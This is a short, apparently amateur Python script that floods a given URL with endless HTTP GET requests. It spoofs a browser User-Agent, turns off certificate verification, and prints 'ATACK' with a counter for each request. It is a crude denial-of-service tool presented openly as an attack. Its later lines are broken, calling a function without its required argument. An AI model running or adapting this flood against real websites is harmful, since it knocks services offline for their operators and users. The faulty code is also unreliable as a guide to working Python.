import requests


def get_link(lin):
  link =  lin
  get_content(link)


def get_content(link):
 i = 1
 if not link.__contains__("http"):
     exit("URL doesnt contains http or https!")

 while True:
    try:

     r = requests.get(link, headers={
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'},
                 verify=False)

     r_answer = r.content
     print('ATACK', i)


     i = i + 1

    except:
        print('DISCONEKT', link)


 try:
    r = requests.get(link, headers={
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=False)
    r_answer = r.content
    print('ATACK ')
    get_link()

 except:
  print('DISCONEKT SITE')
 get_link()
 while True:
  get_content(get_link())
 get_link()
